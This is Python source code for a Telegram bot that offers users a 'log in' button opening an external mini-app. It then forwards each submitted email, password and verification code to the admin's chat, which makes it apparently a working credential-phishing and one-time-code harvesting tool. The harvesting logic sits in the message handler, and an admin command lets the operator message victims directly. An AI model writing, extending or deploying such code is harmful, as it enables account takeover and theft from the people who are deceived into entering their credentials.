import os
import logging
import json
import requests
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

# ==================== КОНФИГ ====================
# Railway сам подставит сюда значения из вкладки Variables
BOT_TOKEN = os.environ.get("BOT_TOKEN")  
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
WEB_APP_URL = "https://d3987616-hue.github.io/erub-miniapp/"  # Твоя ссылка
DB_FILE = "users.json" 
# ===============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Загрузка базы
def load_users():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return set(json.load(f))
    return set()

# Сохранение базы
def save_users(users):
    with open(DB_FILE, "w") as f:
        json.dump(list(users), f)

user_db = load_users()

class ErubBot:
    def __init__(self):
        # Добавляем таймауты
        custom_request = HTTPXRequest(connect_timeout=30.0, read_timeout=30.0)
        
        self.app = Application.builder()\
            .token(BOT_TOKEN)\
            .request(custom_request)\
            .get_updates_request(HTTPXRequest(connect_timeout=30.0))\
            .build()
            
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("send", self.send_to_user))
        self.app.add_handler(MessageHandler(filters.ALL, self.handle))

    async def start(self, update: Update, context):
        user = update.effective_user
        user_id = user.id
        
        if user_id not in user_db:
            user_db.add(user_id)
            save_users(user_db)
            logger.info(f"Новый пользователь: {user_id}")

        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")

        try:
            await self.app.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🟢 НОВЫЙ ВХОД!\n\n👤 ID: `{user_id}`\n👤 Имя: {user.first_name}\n📊 В базе: {len(user_db)}",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления: {e}")

        await update.message.reply_text(
            f"👋 Привет, {user.first_name}!\n\nНажмите кнопку ВНИЗУ, чтобы открыть приложение.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                resize_keyboard=True
            )
        )

    async def send_to_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            return

        if len(context.args) < 2:
            await update.message.reply_text("⚠️ Использование: `/send 123456789 Текст`", parse_mode="Markdown")
            return

        try:
            target_id = int(context.args[0])
            text_to_send = " ".join(context.args[1:])
            await self.app.bot.send_message(chat_id=target_id, text=text_to_send)
            await update.message.reply_text(f"✅ Отправлено пользователю {target_id}.")
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка: {e}")

    async def handle(self, update: Update, context):
        if not update.message: return
        msg = update.message
        chat_id = msg.chat.id
        user_id = msg.from_user.id
        text = msg.text

        if chat_id == ADMIN_ID: return

        if text and text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                
                if email and password and not code:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔔 ЗАЯВКА!\n👤 ID: `{user_id}`\n📧 Логин: `{email}`\n🔑 Пароль: `{password}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Данные приняты.")
                    return

                if code:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📧 КОД!\n👤 ID: `{user_id}`\n🔢 Код: `{code}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Код отправлен.")
                    return
            except Exception as e:
                logger.error(f"Ошибка JSON: {e}")
        else:
            await msg.reply_text("ℹ️ Используйте кнопку «Войти»")

    def run(self):
        print("🚀 БОТ ЗАПУЩЕН")
        self.app.run_polling(bootstrap_retries=5)

if __name__ == "__main__":
    if not BOT_TOKEN:
        print("❌ ОШИБКА: BOT_TOKEN не найден в переменных окружения!")
    else:
        ErubBot().run()
